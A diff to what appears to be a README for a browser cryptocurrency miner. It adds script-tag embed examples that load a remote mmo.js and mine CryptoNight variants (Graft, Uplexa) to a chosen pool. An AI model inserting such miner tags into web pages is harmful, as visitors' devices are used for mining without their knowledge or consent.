@@ -25,6 +25,14 @@ Win UWP: https://www.microsoft.com/store/apps/9NQ95K22H2ZB?ocid=badge
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/r?jason=Your_Favorite_Pool:PortNr" > </script>
 ```
+#### Examples: CN V8 Reverse Coins (Graft) need ?algo=cn/rwz<br> 
+```sh
+<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/rwz?jason=Your_Favorite_Pool:PortNr" > </script>
+```
+#### Examples: CN UPX2 Coins (Uplexa) need ?algo=cn/upx<br> 
+```sh
+<script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/upx?jason=Your_Favorite_Pool:PortNr" > </script>
+```
 #### Examples: CN V8 Coins (Caliber, JyoCoin, PyrexCoin, Safex Cash) need ?algo=cn/2<br> 
 ```sh
 <script src="https://daslebenistkeinponyhof.netlify.com/mmo.js?perfekt=wss://?algo=cn/2?jason=Your_Favorite_Pool:PortNr" > </script>
